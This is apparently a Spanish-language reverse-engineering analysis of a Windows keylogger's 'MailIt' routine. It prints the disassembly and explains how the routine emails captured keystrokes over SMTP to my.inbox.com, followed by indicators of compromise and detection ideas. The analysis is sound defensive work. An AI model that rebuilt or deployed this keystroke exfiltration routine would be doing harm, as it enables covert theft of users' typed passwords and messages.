        00401f06 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401f0a 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401f10 89 04 24        MOV        dword ptr [ESP],EAX
        00401f13 e8 58 09        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00401f18 c7 04 24        MOV        dword ptr [ESP],0x1f4
                 f4 01 00 00
        00401f1f e8 1c 0a        CALL       _Sleep@4                                         void _Sleep@4(DWORD dwMillisecon
                 00 00
        00401f24 83 ec 04        SUB        ESP,0x4
        00401f27 c7 44 24        MOV        dword ptr [ESP + 0x4],DAT_00404502               = 54h    T
                 04 02 45 
                 40 00
        00401f2f 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401f35 89 04 24        MOV        dword ptr [ESP],EAX
        00401f38 e8 73 08        CALL       strcpy                                           undefined strcpy(char * param_1,
                 00 00
        00401f3d 8b 45 0c        MOV        EAX,dword ptr [EBP + param_2]
        00401f40 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401f44 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401f4a 89 04 24        MOV        dword ptr [ESP],EAX
        00401f4d e8 2e 08        CALL       strcat                                           undefined strcat(char * param_1,
                 00 00
        00401f52 c7 44 24        MOV        dword ptr [ESP + 0x4],DAT_00404506               = 0Ah
                 04 06 45 
                 40 00
        00401f5a 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401f60 89 04 24        MOV        dword ptr [ESP],EAX
        00401f63 e8 18 08        CALL       strcat                                           undefined strcat(char * param_1,
                 00 00
        00401f68 c7 44 24        MOV        dword ptr [ESP + 0x4],s_From:_00404508           = "From:"
                 04 08 45 
                 40 00
        00401f70 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401f76 89 04 24        MOV        dword ptr [ESP],EAX
        00401f79 e8 02 08        CALL       strcat                                           undefined strcat(char * param_1,
                 00 00
        00401f7e 8b 45 10        MOV        EAX,dword ptr [EBP + param_3]
        00401f81 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401f85 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401f8b 89 04 24        MOV        dword ptr [ESP],EAX
        00401f8e e8 ed 07        CALL       strcat                                           undefined strcat(char * param_1,
                 00 00
        00401f93 c7 44 24        MOV        dword ptr [ESP + 0x4],DAT_00404506               = 0Ah
                 04 06 45 
                 40 00
        00401f9b 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401fa1 89 04 24        MOV        dword ptr [ESP],EAX
        00401fa4 e8 d7 07        CALL       strcat                                           undefined strcat(char * param_1,
                 00 00
        00401fa9 c7 44 24        MOV        dword ptr [ESP + 0x4],s_Subject:_0040450e        = "Subject:"
                 04 0e 45 
                 40 00
        00401fb1 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401fb7 89 04 24        MOV        dword ptr [ESP],EAX
        00401fba e8 c1 07        CALL       strcat                                           undefined strcat(char * param_1,
                 00 00
        00401fbf 8b 45 14        MOV        EAX,dword ptr [EBP + param_4]
        00401fc2 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401fc6 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401fcc 89 04 24        MOV        dword ptr [ESP],EAX
        00401fcf e8 ac 07        CALL       strcat                                           undefined strcat(char * param_1,
                 00 00
        00401fd4 c7 44 24        MOV        dword ptr [ESP + 0x4],DAT_00404506               = 0Ah
                 04 06 45 
                 40 00
        00401fdc 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401fe2 89 04 24        MOV        dword ptr [ESP],EAX
        00401fe5 e8 96 07        CALL       strcat                                           undefined strcat(char * param_1,
                 00 00
        00401fea 8b 45 18        MOV        EAX,dword ptr [EBP + param_5]
        00401fed 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401ff1 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401ff7 89 04 24        MOV        dword ptr [ESP],EAX
        00401ffa e8 81 07        CALL       strcat                                           undefined strcat(char * param_1,
                 00 00
        00401fff c7 44 24        MOV        dword ptr [ESP + 0x4],s_._00404517               = "\r\n.\r\n"
                 04 17 45 
                 40 00
        00402007 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        0040200d 89 04 24        MOV        dword ptr [ESP],EAX
        00402010 e8 6b 07        CALL       strcat                                           undefined strcat(char * param_1,
                 00 00
        00402015 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        0040201b 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        0040201f 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00402025 89 04 24        MOV        dword ptr [ESP],EAX
        00402028 e8 43 08        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        0040202d 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00402033 89 04 24        MOV        dword ptr [ESP],EAX
        00402036 e8 65 07        CALL       strlen                                           undefined strlen(char * param_1)
                 00 00
        0040203b c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00402043 89 44 24 08     MOV        dword ptr [ESP + 0x8],EAX
        00402047 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        0040204d 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00402051 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00402054 89 04 24        MOV        dword ptr [ESP],EAX
        00402057 e8 d4 01        CALL       send                                             undefined send(SOCKET param_1, c
                 00 00
        0040205c 83 ec 10        SUB        ESP,0x10
        0040205f 89 85 50        MOV        dword ptr [EBP + local_1b4],EAX
                 fe ff ff
        00402065 c7 04 24        MOV        dword ptr [ESP],0x1f4
                 f4 01 00 00
        0040206c e8 cf 08        CALL       _Sleep@4                                         void _Sleep@4(DWORD dwMillisecon
                 00 00
        00402071 83 ec 04        SUB        ESP,0x4
        00402074 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        0040207c c7 44 24        MOV        dword ptr [ESP + 0x8],0x12c
                 08 2c 01 
                 00 00
        00402084 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        0040208a 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        0040208e 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00402091 89 04 24        MOV        dword ptr [ESP],EAX
        00402094 e8 87 01        CALL       recv                                             undefined recv(SOCKET param_1, c
                 00 00
        00402099 83 ec 10        SUB        ESP,0x10
        0040209c 89 85 4c        MOV        dword ptr [EBP + local_1b8],EAX
                 fe ff ff
        004020a2 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        004020a8 03 85 4c        ADD        EAX,dword ptr [EBP + local_1b8]
                 fe ff ff
        004020ae c6 00 00        MOV        byte ptr [EAX],0x0
        004020b1 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        004020b7 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        004020bb 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        004020c1 89 04 24        MOV        dword ptr [ESP],EAX
        004020c4 e8 a7 07        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        004020c9 c7 44 24        MOV        dword ptr [ESP + 0x4],s_quit_0040451d            = "quit\n"
                 04 1d 45 
                 40 00
        004020d1 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        004020d7 89 04 24        MOV        dword ptr [ESP],EAX
        004020da e8 d1 06        CALL       strcpy                                           undefined strcpy(char * param_1,
                 00 00
        004020df 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        004020e5 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        004020e9 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        004020ef 89 04 24        MOV        dword ptr [ESP],EAX
        004020f2 e8 79 07        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        004020f7 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        004020fd 89 04 24        MOV        dword ptr [ESP],EAX
        00402100 e8 9b 06        CALL       strlen                                           undefined strlen(char * param_1)
                 00 00
        00402105 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        0040210d 89 44 24 08     MOV        dword ptr [ESP + 0x8],EAX
        00402111 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00402117 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        0040211b 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        0040211e 89 04 24        MOV        dword ptr [ESP],EAX
        00402121 e8 0a 01        CALL       send                                             undefined send(SOCKET param_1, c
                 00 00
        00402126 83 ec 10        SUB        ESP,0x10
        00402129 89 85 50        MOV        dword ptr [EBP + local_1b4],EAX
                 fe ff ff
        0040212f c7 04 24        MOV        dword ptr [ESP],0x1f4
                 f4 01 00 00
        00402136 e8 05 08        CALL       _Sleep@4                                         void _Sleep@4(DWORD dwMillisecon
                 00 00
        0040213b 83 ec 04        SUB        ESP,0x4
        0040213e c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00402146 c7 44 24        MOV        dword ptr [ESP + 0x8],0x12c
                 08 2c 01 
                 00 00
        0040214e 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00402154 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00402158 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        0040215b 89 04 24        MOV        dword ptr [ESP],EAX
        0040215e e8 bd 00        CALL       recv                                             undefined recv(SOCKET param_1, c
                 00 00
        00402163 83 ec 10        SUB        ESP,0x10
        00402166 89 85 4c        MOV        dword ptr [EBP + local_1b8],EAX
                 fe ff ff
        0040216c 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00402172 03 85 4c        ADD        EAX,dword ptr [EBP + local_1b8]
                 fe ff ff
        00402178 c6 00 00        MOV        byte ptr [EAX],0x0
        0040217b 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00402181 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00402185 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        0040218b 89 04 24        MOV        dword ptr [ESP],EAX
        0040218e e8 dd 06        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00402193 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00402199 89 04 24        MOV        dword ptr [ESP],EAX
        0040219c e8 af 06        CALL       fclose                                           undefined fclose(FILE * param_1)
                 00 00
        004021a1 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        004021a4 89 04 24        MOV        dword ptr [ESP],EAX
        004021a7 e8 94 00        CALL       closesocket                                      undefined closesocket(SOCKET par
                 00 00
        004021ac 83 ec 04        SUB        ESP,0x4
        004021af e8 1c 00        CALL       _WSACleanup@0                                    int _WSACleanup@0(void)
                 00 00
                             LAB_004021b4                                    XREF[1]:     004019e6(j)  
        004021b4 8b 85 40        MOV        EAX,dword ptr [EBP + local_5c4]
                 fa ff ff
        004021ba c9              LEAVE
        004021bb c3              RET
        004021bc 90              ??         90h
        004021bd 90              ??         90h
        004021be 90              ??         90h
        004021bf 90              ??         90h


```

1. Inicializacin de red

    Llama a WSAStartup(0x202, &WSAData)  inicializa Winsock.

    Si falla, lo reporta con fputs("WSAStartup failed") y aborta.

 2. Resolucin de DNS

gethostbyname(smtp_host)  // ejemplo: "my.inbox.com"

    Si falla, llama a perror("gethostbyname") y termina el proceso.

 3. Construccin de la sockaddr_in

    Usa memset, memcpy, y htons(25) para configurar la estructura.

    El puerto 25 (0x19) indica SMTP estndar.

 4. Conexin al servidor SMTP

    Usa socket() y connect() para abrir una conexin TCP con el servidor de correo.

    Si connect() falla, aborta con perror("connect").

 5. Comunicacin SMTP paso a paso

La funcin emula completamente un cliente SMTP. El flujo es:

    recv()  Espera banner del servidor.

    send("HELO ...")

    MAIL FROM:<from>

    RCPT TO:<to>

    DATA

    Cuerpo del correo:

        "From:" + from

        "Subject:" + subject

        message (contenido del log)

    Termina con "\r\n.\r\n"

    QUIT

 Cada comando es enviado con send() y confirmado con recv().
 6. Logs y delays

    Usa fputs() para loguear las respuestas del servidor en C:\WINDOWS\lzwz.av.

    Espera con Sleep(500) entre cada comando (anti-automatizacin rpida).

    Usa buffer intermedio local_5bc para construir cadenas (hasta 0x5d8 bytes de stack).

 7. Limpieza final

    Llama a closesocket() y WSACleanup() correctamente.

 Resumen funcional de MailIt
Componente	Funcin
WSAStartup	Inicializa red en Windows
gethostbyname	Obtiene IP del servidor SMTP (my.inbox.com)
socket + connect	Establece conexin TCP al puerto 25
send, recv	Comandos SMTP paso a paso (HELO, MAIL FROM, RCPT TO, DATA, QUIT)
fputs, fopen	Log local del intercambio SMTP en C:\WINDOWS\lzwz.av
Sleep(500)	Delay entre comandos
strcat, strncat	Construccin manual de comandos SMTP
send(message)	Exfiltra contenido capturado (del keylogger) como cuerpo del correo
closesocket	Cierra conexin TCP
 Datos de exfiltracin

De get_keys()  MailIt() se pasan:

    smtp_host: "my.inbox.com"

    to: "unknown-g@inbox.com"

    from: "unknown-g@hotmail.co.uk"

    subject: "Logged"

    message: contenido del keylogger

 Indicadores de compromiso (IOC)
Tipo	Valor
SMTP Server	my.inbox.com
FROM address	unknown-g@hotmail.co.uk
TO address	unknown-g@inbox.com
Log file	C:\WINDOWS\lzwindowlz.av
SMTP log	C:\WINDOWS\lzwz.av
SMTP puerto	25
 Cmo detectar esto?

    Reglas YARA por cadenas fijas como:

        "C:\\WINDOWS\\lzwindowlz.av"

        "my.inbox.com", "MAIL FROM:<", "RCPT TO:<", "\r\n.\r\n"

    Monitoreo de trfico de red (si no hay cifrado):

        Trfico saliente al puerto 25  raro en mquinas cliente.

        Dominio SMTP sospechoso.

    Anlisis forense:

        Presencia de lzwindowlz.av o lzwz.av

        Presencia de buffers SMTP hardcodeados en binarios
